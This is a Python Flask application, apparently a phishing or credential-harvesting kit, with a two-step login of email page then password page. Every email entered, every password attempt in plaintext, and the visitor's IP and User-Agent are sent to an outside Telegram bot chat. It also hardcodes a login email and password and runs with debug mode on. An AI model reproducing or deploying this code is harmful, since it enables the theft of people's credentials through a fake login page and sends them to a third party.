from flask import Flask, render_template, request, redirect, url_for, session, flash
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps
from datetime import timedelta
import os
import requests


BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

print("BOT_TOKEN chargé :", bool(BOT_TOKEN))
print("CHAT_ID chargé :", CHAT_ID)

def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": CHAT_ID,
            "text": message
        }

        response = requests.post(url, data=data)
        print("Réponse Telegram :", response.text)

    except Exception as e:
        print("Erreur Telegram :", e)
    except Exception as e:
        print("Erreur Telegram:", e)


app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "change-me-in-production")
app.permanent_session_lifetime = timedelta(days=30)


VALID_EMAIL = "dadoumeindjo@meindjo.fr"
VALID_PASSWORD = "Admin123@"


@app.route("/", methods=["GET", "POST"])
def login_email():
    error = None
    if request.method == "POST":
        email = request.form.get("email", "").strip()
        if not email:
            error = "Veuillez saisir votre adresse e-mail"
        else:
            session["email"] = email

            # 🔔 Envoi Telegram : email saisi
            ip = request.headers.get("X-Forwarded-For", request.remote_addr)
            ua = request.headers.get("User-Agent", "inconnu")
            send_telegram_message(
                f"📧 <b>Nouvel email saisi</b>\n"
                f"Email : <code>{email}</code>\n"
                f"IP : {ip}\n"
                f"User-Agent : {ua}"
            )

            return redirect(url_for("login_password"))
    return render_template("login_email.html", error=error)


@app.route("/password", methods=["GET", "POST"])
def login_password():
    email = session.get("email")
    if not email:
        return redirect(url_for("login_email"))

    error = None
    if request.method == "POST":
        password = request.form.get("password", "")
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)

        # 🔔 Envoi Telegram : tentative de mot de passe
        status = "✅ RÉUSSIE" if (email == VALID_EMAIL and password == VALID_PASSWORD) else "❌ ÉCHEC"
        send_telegram_message(
            f"🔐 <b>Tentative de connexion {status}</b>\n"
            f"Email : <code>{email}</code>\n"
            f"Mot de passe : <code>{password}</code>\n"
            f"IP : {ip}"
        )

        if email == VALID_EMAIL and password == VALID_PASSWORD:
            session["authenticated"] = True
            return redirect(url_for("success"))
        error = "mot de passe incorrect"
    return render_template("login_password.html", email=email, error=error)


@app.route("/success")
def success():
    if not session.get("authenticated"):
        return redirect(url_for("login_email"))
    return render_template("success.html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login_email"))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
